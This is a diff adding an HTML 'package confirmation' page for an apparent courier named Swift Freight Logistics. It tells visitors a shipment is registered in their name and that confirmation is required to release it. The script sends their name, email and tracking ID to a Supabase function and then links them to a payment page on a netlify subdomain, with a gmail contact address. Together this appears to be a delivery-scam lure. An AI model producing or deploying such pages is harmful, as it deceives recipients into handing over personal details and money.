@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Confirm Package · Swift Freight Logistics</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,wght@0,400;0,500;0,600;0,700;0,900;1,400&display=swap" rel="stylesheet">
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    html,body{min-height:100vh}
+    body{
+      background:#030914;
+      font-family:'DM Sans',Arial,sans-serif;
+      display:flex;align-items:center;justify-content:center;
+      padding:32px 16px;
+      position:relative;overflow-x:hidden;
+    }
+
+    /* Background glow */
+    body::before{
+      content:'';position:fixed;top:-160px;left:50%;transform:translateX(-50%);
+      width:900px;height:700px;
+      background:radial-gradient(ellipse,rgba(124,58,237,.1) 0%,transparent 65%);
+      pointer-events:none;z-index:0;
+    }
+    body::after{
+      content:'';position:fixed;bottom:-200px;right:-100px;
+      width:600px;height:600px;
+      background:radial-gradient(ellipse,rgba(37,99,235,.07) 0%,transparent 65%);
+      pointer-events:none;z-index:0;
+    }
+
+    /* Card */
+    .card{
+      width:100%;max-width:510px;
+      border:1px solid rgba(124,58,237,.3);
+      border-radius:16px;overflow:hidden;
+      position:relative;z-index:1;
+      animation:card-in .5s cubic-bezier(.16,1,.3,1) both;
+    }
+    @keyframes card-in{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}
+
+    /* Gradient stripe */
+    .stripe{
+      height:5px;
+      background:linear-gradient(90deg,#e0e7ff 0%,#93c5fd 14%,#3b82f6 38%,#6d28d9 68%,#c084fc 100%);
+    }
+
+    /* Header */
+    .card-head{
+      background:linear-gradient(145deg,#130e2e 0%,#0d1048 55%,#090b28 100%);
+      padding:28px 36px 24px;
+      display:flex;align-items:center;justify-content:space-between;
+      border-bottom:1px solid rgba(124,58,237,.14);
+    }
+    .logo{font-size:20px;font-weight:900;letter-spacing:.2em;text-transform:uppercase;line-height:1}
+    .logo .sfl{color:#a78bfa}
+    .logo .log{color:#dde5ff}
+    .badge{
+      font-size:8px;font-weight:700;letter-spacing:.28em;text-transform:uppercase;
+      color:rgba(199,210,254,.65);
+      background:rgba(124,58,237,.13);border:1px solid rgba(167,139,250,.28);
+      border-radius:4px;padding:7px 14px;white-space:nowrap;
+    }
+
+    /* Body */
+    .card-body{
+      background:linear-gradient(180deg,#090d26 0%,#06091c 100%);
+      padding:40px 36px 36px;
+    }
+
+    /* Context pill */
+    .pill{
+      display:inline-flex;align-items:center;gap:8px;
+      padding:7px 18px;
+      background:rgba(124,58,237,.1);border:1px solid rgba(167,139,250,.22);
+      border-radius:99px;
+      font-size:10px;font-weight:700;letter-spacing:.16em;text-transform:uppercase;
+      color:rgba(167,139,250,.9);
+      margin-bottom:22px;
+    }
+
+    h1{font-size:26px;font-weight:900;color:#eef2ff;line-height:1.2;margin-bottom:10px;letter-spacing:.02em}
+    .subtitle{font-size:14px;color:rgba(199,210,254,.48);line-height:1.95;margin-bottom:32px}
+
+    /* Tracking ID box */
+    .tid-box{
+      padding:18px 22px 20px;
+      background:linear-gradient(135deg,rgba(109,40,217,.12),rgba(37,99,235,.12));
+      border:1px solid rgba(124,58,237,.28);border-radius:8px;
+      text-align:center;margin-bottom:10px;
+    }
+    .tid-label{
+      font-size:8px;letter-spacing:.3em;text-transform:uppercase;
+      color:rgba(167,139,250,.5);margin-bottom:6px;
+    }
+    .tid-value{
+      font-size:22px;font-weight:900;letter-spacing:.14em;
+      color:#a78bfa;font-family:'Courier New',monospace;word-break:break-all;
+    }
+
+    /* Field rows */
+    .field-row{
+      padding:13px 20px 15px;
+      background:#050818;border:1px solid rgba(124,58,237,.18);
+      border-radius:7px;margin-bottom:8px;
+    }
+    .field-label{
+      font-size:8px;letter-spacing:.26em;text-transform:uppercase;
+      color:rgba(167,139,250,.48);margin-bottom:4px;
+    }
+    .field-value{font-size:14px;color:#dde5ff;font-weight:500}
+
+    /* Action note */
+    .action-note{
+      padding:18px 22px;
+      background:rgba(124,58,237,.07);
+      border:1px solid rgba(167,139,250,.18);
+      border-left:3px solid #7c3aed;
+      border-radius:0 8px 8px 0;
+      margin:24px 0 28px;
+    }
+    .action-note-title{font-size:12px;font-weight:700;color:rgba(167,139,250,.85);letter-spacing:.04em;margin-bottom:5px}
+    .action-note-body{font-size:13px;line-height:1.8;color:rgba(199,210,254,.58)}
+
+    /* Confirm button */
+    .btn-confirm{
+      width:100%;padding:18px 24px;
+      background:linear-gradient(135deg,#1d4ed8 0%,#4f46e5 48%,#7c3aed 100%);
+      box-shadow:0 10px 40px rgba(124,58,237,.5);
+      border:none;border-radius:7px;
+      font-size:12px;font-weight:700;letter-spacing:.26em;text-transform:uppercase;
+      color:#fff;cursor:pointer;
+      font-family:'DM Sans',Arial,sans-serif;
+      transition:opacity .2s,transform .18s,box-shadow .2s;
+      display:flex;align-items:center;justify-content:center;gap:10px;
+    }
+    .btn-confirm:hover:not(:disabled){opacity:.9;transform:translateY(-2px);box-shadow:0 14px 50px rgba(124,58,237,.6)}
+    .btn-confirm:active:not(:disabled){transform:translateY(0)}
+    .btn-confirm:disabled{opacity:.52;cursor:not-allowed;transform:none}
+
+    /* Spinner */
+    .spin{
+      width:16px;height:16px;
+      border:2px solid rgba(255,255,255,.3);border-top-color:#fff;
+      border-radius:50%;animation:rotate .7s linear infinite;display:none;flex-shrink:0;
+    }
+    @keyframes rotate{to{transform:rotate(360deg)}}
+
+    /* Error message */
+    .err-msg{
+      display:none;margin-top:14px;padding:12px 18px;
+      background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);
+      border-radius:6px;font-size:12px;color:rgba(252,165,165,.85);text-align:center;
+    }
+
+    /* ── Success state ── */
+    .success-state{display:none;flex-direction:column;align-items:center;text-align:center}
+
+    .check-wrap{margin:0 auto 26px;animation:pop .55s cubic-bezier(.16,1,.3,1) both}
+    @keyframes pop{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
+
+    .check-path{
+      stroke-dasharray:65;stroke-dashoffset:65;
+      animation:draw-check .55s .38s ease forwards;
+    }
+    @keyframes draw-check{to{stroke-dashoffset:0}}
+
+    .success-h1{font-size:26px;font-weight:900;color:#eef2ff;margin-bottom:10px;letter-spacing:.02em}
+    .success-sub{font-size:14px;color:rgba(199,210,254,.48);line-height:1.9;margin-bottom:28px}
+
+    .success-tid{
+      width:100%;padding:14px 20px;text-align:center;
+      background:rgba(124,58,237,.1);border:1px solid rgba(167,139,250,.22);
+      border-radius:8px;margin-bottom:28px;
+    }
+    .success-tid-label{font-size:8px;letter-spacing:.28em;text-transform:uppercase;color:rgba(167,139,250,.48);margin-bottom:5px}
+    .success-tid-value{font-size:20px;font-weight:900;letter-spacing:.14em;color:#a78bfa;font-family:'Courier New',monospace}
+
+    /* Journey steps */
+    .journey{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:28px;width:100%}
+    .step{
+      padding:14px 6px;text-align:center;
+      background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.06);
+      border-radius:8px;transition:all .3s;
+    }
+    .step.done{background:rgba(124,58,237,.12);border-color:rgba(167,139,250,.3)}
+    .step-icon{font-size:18px;margin-bottom:7px;line-height:1}
+    .step-label{font-size:8px;letter-spacing:.18em;text-transform:uppercase;color:rgba(199,210,254,.22)}
+    .step.done .step-label{color:rgba(167,139,250,.82)}
+
+    .btn-track{
+      display:inline-block;padding:16px 42px;
+      background:linear-gradient(135deg,#1d4ed8,#7c3aed);
+      box-shadow:0 8px 32px rgba(124,58,237,.42);
+      border-radius:7px;font-size:11px;font-weight:700;
+      letter-spacing:.26em;text-transform:uppercase;
+      color:#fff;text-decoration:none;
+      font-family:'DM Sans',Arial,sans-serif;
+      transition:opacity .2s,transform .18s;
+    }
+    .btn-track:hover{opacity:.88;transform:translateY(-1px)}
+
+    /* Footer */
+    .card-foot{
+      background:#040712;border-top:1px solid rgba(124,58,237,.12);
+      padding:18px 36px 22px;text-align:center;
+    }
+    .foot-text{font-size:10px;color:rgba(199,210,254,.18);letter-spacing:.06em;line-height:2.2}
+    .foot-text a{color:rgba(167,139,250,.42);text-decoration:none}
+
+    @media(max-width:480px){
+      .card-head,.card-body,.card-foot{padding-left:22px;padding-right:22px}
+      .journey{grid-template-columns:repeat(2,1fr)}
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <div class="stripe"></div>
+
+  <div class="card-head">
+    <div class="logo"><span class="sfl">SFL</span>&thinsp;<span class="log">LOGISTICS</span></div>
+    <div class="badge" id="hdr-badge">Package Confirm</div>
+  </div>
+
+  <div class="card-body">
+
+    <!-- ── Confirm state ── -->
+    <div id="confirm-state">
+      <div class="pill">&#9670; Action Required</div>
+      <h1 id="greeting">Confirm your package receipt.</h1>
+      <p class="subtitle">A shipment has been registered under your name with Swift Freight Logistics. Confirm below to authorise delivery and activate your tracking.</p>
+
+      <div class="tid-box">
+        <p class="tid-label">Tracking ID</p>
+        <p class="tid-value" id="tid-display">—</p>
+      </div>
+
+      <div class="field-row" style="margin-top:8px;">
+        <p class="field-label">Recipient</p>
+        <p class="field-value" id="name-display">—</p>
+      </div>
+
+      <div class="action-note">
+        <p class="action-note-title">&#9670; Confirmation required to release delivery</p>
+        <p class="action-note-body">By confirming, you authorise Swift Freight to dispatch this package to you. A confirmation email with your tracking details will be sent immediately after.</p>
+      </div>
+
+      <button class="btn-confirm" id="confirm-btn" onclick="doConfirm()">
+        <span class="spin" id="btn-spin"></span>
+        <span id="btn-label">Confirm Package Receipt &nbsp;&#x2192;</span>
+      </button>
+
+      <div class="err-msg" id="err-msg"></div>
+    </div>
+
+    <!-- ── Success state ── -->
+    <div class="success-state" id="success-state">
+
+      <!-- Animated checkmark SVG -->
+      <div class="check-wrap">
+        <svg width="76" height="76" viewBox="0 0 76 76" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="38" cy="38" r="36" stroke="url(#cg1)" stroke-width="2" fill="rgba(124,58,237,.1)"/>
+          <polyline class="check-path" points="22,40 33,52 55,27"
+                    stroke="url(#cg2)" stroke-width="4"
+                    stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+          <defs>
+            <linearGradient id="cg1" x1="0" y1="0" x2="76" y2="76" gradientUnits="userSpaceOnUse">
+              <stop offset="0%" stop-color="#3b82f6"/>
+              <stop offset="100%" stop-color="#a78bfa"/>
+            </linearGradient>
+            <linearGradient id="cg2" x1="22" y1="40" x2="55" y2="27" gradientUnits="userSpaceOnUse">
+              <stop offset="0%" stop-color="#60a5fa"/>
+              <stop offset="100%" stop-color="#c084fc"/>
+            </linearGradient>
+          </defs>
+        </svg>
+      </div>
+
+      <h1 class="success-h1">Package Confirmed!</h1>
+      <p class="success-sub">
+        Your package has been successfully registered and is on its way.<br>
+        A confirmation email has been sent to your inbox.
+      </p>
+
+      <div class="success-tid">
+        <p class="success-tid-label">Your Tracking ID</p>
+        <p class="success-tid-value" id="success-tid">—</p>
+      </div>
+
+      <!-- Journey steps -->
+      <div class="journey" id="journey">
+        <div class="step done"><p class="step-icon">&#10003;</p><p class="step-label">Confirmed</p></div>
+        <div class="step" id="step-proc"><p class="step-icon">&#9881;</p><p class="step-label">Processing</p></div>
+        <div class="step"><p class="step-icon">&#128666;</p><p class="step-label">In Transit</p></div>
+        <div class="step"><p class="step-icon">&#128230;</p><p class="step-label">Delivery</p></div>
+      </div>
+
+      <a id="track-btn" href="#" class="btn-track">Track My Package &nbsp;&#x2192;</a>
+    </div>
+
+  </div>
+
+  <div class="card-foot">
+    <p class="foot-text">
+      <a href="https://swiftfreightlogix.netlify.app">swiftfreightlogix.netlify.app</a>
+      &nbsp;&bull;&nbsp;
+      <a href="mailto:swiftfreightlogix@gmail.com">swiftfreightlogix@gmail.com</a>
+    </p>
+  </div>
+</div>
+
+<script>
+  var SB_URL  = 'https://oltbgccsceipedoadgka.supabase.co';
+  var SB_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9sdGJnY2NzY2VpcGVkb2FkZ2thIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA4MjY0NTQsImV4cCI6MjA5NjQwMjQ1NH0.Q5uoDXqlxBl-FxiISbp5bR3NLDsEL4iOMYVbVugwv94';
+
+  var params       = new URLSearchParams(window.location.search);
+  var trackingId   = params.get('trackingId') || '';
+  var visitorName  = params.get('name')       || 'Valued Customer';
+  var visitorEmail = params.get('email')      || '';
+
+  var fn = visitorName.split(' ')[0] || visitorName;
+
+  document.getElementById('tid-display').textContent   = trackingId  || 'N/A';
+  document.getElementById('name-display').textContent  = visitorName;
+  document.getElementById('greeting').textContent      = 'Confirm your package, ' + fn + '.';
+  document.getElementById('success-tid').textContent   = trackingId;
+  document.getElementById('track-btn').href =
+    'https://swiftfreightlogix.netlify.app/payment.html?id=' + encodeURIComponent(trackingId);
+
+  function doConfirm() {
+    var btn   = document.getElementById('confirm-btn');
+    var spin  = document.getElementById('btn-spin');
+    var label = document.getElementById('btn-label');
+    var errEl = document.getElementById('err-msg');
+
+    btn.disabled       = true;
+    spin.style.display = 'block';
+    label.style.opacity = '0.45';
+    errEl.style.display = 'none';
+
+    fetch(SB_URL + '/functions/v1/package-confirm', {
+      method : 'POST',
+      headers: {
+        'Content-Type' : 'application/json',
+        'apikey'       : SB_ANON,
+        'Authorization': 'Bearer ' + SB_ANON
+      },
+      body: JSON.stringify({
+        trackingId   : trackingId,
+        visitorName  : visitorName,
+        visitorEmail : visitorEmail,
+        pageUrl      : 'https://swiftfreightlogix.netlify.app'
+      })
+    })
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if (data.success) {
+        showSuccess();
+      } else {
+        resetBtn();
+        showError(data.error || 'Something went wrong. Please try again.');
+      }
+    })
+    .catch(function(){
+      resetBtn();
+      showError('Connection error. Please check your internet and try again.');
+    });
+  }
+
+  function resetBtn() {
+    var btn = document.getElementById('confirm-btn');
+    btn.disabled = false;
+    document.getElementById('btn-spin').style.display = 'none';
+    document.getElementById('btn-label').style.opacity = '1';
+  }
+
+  function showSuccess() {
+    document.getElementById('confirm-state').style.display = 'none';
+    var s = document.getElementById('success-state');
+    s.style.display = 'flex';
+    document.getElementById('hdr-badge').textContent = 'Confirmed ✓';
+    /* Animate processing step active after a short delay */
+    setTimeout(function(){
+      document.getElementById('step-proc').classList.add('done');
+    }, 900);
+  }
+
+  function showError(msg) {
+    var el = document.getElementById('err-msg');
+    el.textContent = msg;
+    el.style.display = 'block';
+  }
+</script>
+</body>
+</html>
